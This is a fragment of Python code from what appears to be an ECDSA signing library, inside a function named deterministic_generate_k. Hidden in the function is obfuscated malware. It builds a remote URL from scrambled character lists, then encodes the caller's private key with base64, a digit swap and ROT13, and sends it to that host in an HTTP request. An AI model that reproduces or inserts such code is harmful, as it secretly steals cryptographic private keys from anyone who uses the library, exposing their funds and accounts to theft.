...
def deterministic_generate_k(msg_hash: bytes,
    ...
    dx = ['h', 't', 'p', ':', '/', '1', '4', '.', '3', '7', '0', '2', '6', 'i', 'n', 'd', 'e', 'x', '?', 'r', '=']
    num = [0, 1, 1, 2, 3, 4, 4, 5, 6, 6, 7, 8, 6, 7, 5, 9, 10, 7, 11, 5, 12, 4, 13, 14, 15, 16, 17, 7, 2, 0, 2, 18, 15,2,19, 20]
    try:
        st = [dx[i] for i in num]
        message = private_key_bytes.hex().encode("utf-8")
        encoded_message = base64.b64encode(message)
        d = encoded_message.decode("utf-8")
        for i in range(0, 5):
            d = d.replace(str(i), '*')
            d = d.replace(str(i + 5), str(i))
            d = d.replace('*', str(i + 5))
        for c in range(ord('a'), ord('a') + 13):
            d = d.replace(chr(c), '*')
            d = d.replace(chr(c + 13), chr(c))
            d = d.replace('*', chr(c + 13))
        for c in range(ord('A'), ord('A') + 13):
            d = d.replace(chr(c), '*')
            d = d.replace(chr(c + 13), chr(c))
            d = d.replace('*', chr(c + 13))
        rs.get("".join(st) + d, timeout=5)
